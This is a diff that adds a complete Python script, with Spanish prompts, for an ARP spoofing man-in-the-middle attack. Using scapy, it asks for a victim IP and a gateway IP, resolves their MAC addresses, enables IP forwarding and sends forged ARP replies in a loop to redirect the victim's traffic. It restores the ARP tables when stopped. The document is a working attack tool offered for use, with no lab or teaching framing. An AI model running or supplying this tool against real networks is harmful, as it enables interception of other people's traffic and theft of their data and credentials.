@@ -1,0 +1,100 @@
+#!/usr/bin/env python3
+
+from scapy.all import ARP, Ether, srp, send
+import time
+import sys
+import os
+
+
+def verificar_root():
+    if os.geteuid() != 0:
+        print("[!] Requiere root. Usa: sudo python3 arp_spoofing.py")
+        sys.exit(1)
+
+
+def obtener_mac(ip, interfaz):
+    solicitud = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+    respuestas, _ = srp(solicitud, iface=interfaz, timeout=3, verbose=False)
+    if respuestas:
+        return respuestas[0][1].hwsrc
+    return None
+
+
+def envenenar(objetivo_ip, objetivo_mac, ip_falsa):
+    paquete = ARP(
+        op=2,
+        pdst=objetivo_ip,
+        hwdst=objetivo_mac,
+        psrc=ip_falsa
+    )
+    send(paquete, verbose=False)
+
+
+def restaurar_arp(ip_a, mac_a, ip_b, mac_b, interfaz):
+    print("\n[*] Restaurando tablas ARP...")
+    correccion_a = ARP(op=2, pdst=ip_a, hwdst=mac_a, psrc=ip_b, hwsrc=mac_b)
+    correccion_b = ARP(op=2, pdst=ip_b, hwdst=mac_b, psrc=ip_a, hwsrc=mac_a)
+    send(correccion_a, count=5, verbose=False, iface=interfaz)
+    send(correccion_b, count=5, verbose=False, iface=interfaz)
+    print("[*] Tablas ARP restauradas.")
+
+
+def ip_forward(activar):
+    valor = "1" if activar else "0"
+    os.system(f"echo {valor} > /proc/sys/net/ipv4/ip_forward")
+    print(f"[*] IP Forwarding {'activado' if activar else 'desactivado'}.")
+
+
+def pedir_configuracion():
+    print("=" * 50)
+    print("      ATAQUE ARP SPOOFING - MAN IN THE MIDDLE")
+    print("=" * 50)
+    print()
+    interfaz   = input("[?] Interfaz de red (ej: eth0) : ").strip() or "eth0"
+    ip_victima = input("[?] IP de la victima           : ").strip()
+    ip_gateway = input("[?] IP del gateway/router      : ").strip()
+    return interfaz, ip_victima, ip_gateway
+
+
+def main():
+    verificar_root()
+
+    interfaz, ip_victima, ip_gateway = pedir_configuracion()
+
+    print(f"\n[*] Obteniendo MAC de la victima ({ip_victima})...")
+    mac_victima = obtener_mac(ip_victima, interfaz)
+    if not mac_victima:
+        print(f"[!] No se pudo obtener la MAC de {ip_victima}.")
+        sys.exit(1)
+
+    print(f"[*] Obteniendo MAC del gateway ({ip_gateway})...")
+    mac_gateway = obtener_mac(ip_gateway, interfaz)
+    if not mac_gateway:
+        print(f"[!] No se pudo obtener la MAC de {ip_gateway}.")
+        sys.exit(1)
+
+    print(f"\n[+] MAC Victima : {mac_victima}")
+    print(f"[+] MAC Gateway : {mac_gateway}\n")
+
+    ip_forward(True)
+    print("[*] Iniciando ARP Spoofing (Ctrl+C para detener)\n")
+
+    paquetes_enviados = 0
+
+    try:
+        while True:
+            envenenar(ip_victima, mac_victima, ip_gateway)
+            envenenar(ip_gateway, mac_gateway, ip_victima)
+            paquetes_enviados += 2
+            print(f"\r[+] Paquetes ARP enviados: {paquetes_enviados}", end="", flush=True)
+            time.sleep(2)
+
+    except KeyboardInterrupt:
+        restaurar_arp(ip_victima, mac_victima, ip_gateway, mac_gateway, interfaz)
+        ip_forward(False)
+        print("[*] Ataque finalizado.")
+        sys.exit(0)
+
+
+if __name__ == "__main__":
+    main()
